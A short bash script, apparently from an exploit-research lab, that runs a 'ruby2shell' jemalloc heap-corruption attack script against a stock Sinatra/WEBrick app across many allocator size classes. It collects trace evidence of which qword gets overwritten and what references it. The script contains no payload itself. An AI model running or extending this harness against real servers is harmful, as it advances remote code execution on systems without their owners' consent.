#!/usr/bin/env bash
# Stock classic Sinatra under WEBrick: prove which jemalloc-adjacent qword
# actually changes to low byte 0x53, then dump live references to that qword.
# Analysis only; the request path remains the unmodified stock app.
set -u
cd "$(dirname "$0")/../.." || exit 2
CLASSES="${*:-80 96 128 160 192 224 256 320 384 448 512 640}"
for c in $CLASSES; do
  port=$((4650 + c / 10))
  tag="webrickscan${c}"
  printf '== C=%s port=%s\n' "$c" "$port"
  JEM_RACK_ENV=production JEM_CLASS="$c" JEM_WIRE_SERVER=webrick \
    JEMTRACE_TRACK_OVERFLOW=1 JEMTRACE_SCAN_REFS=1 \
    JEM_WIRE_PORT="$port" timeout 90 \
    bash lab/repro/ruby2shell-jemalloc-wire.sh attack "$tag"
  trace="lab/build/evidence/$tag.trace"
  printf 'proven overwrite: '
  grep '^O ' "$trace" 2>/dev/null || echo '(none)'
  printf 'pre-write qword: '
  grep '^P ' "$trace" 2>/dev/null || echo '(none)'
  printf 'references=%s\n' "$(grep -c '^REF ' "$trace" 2>/dev/null || true)"
done
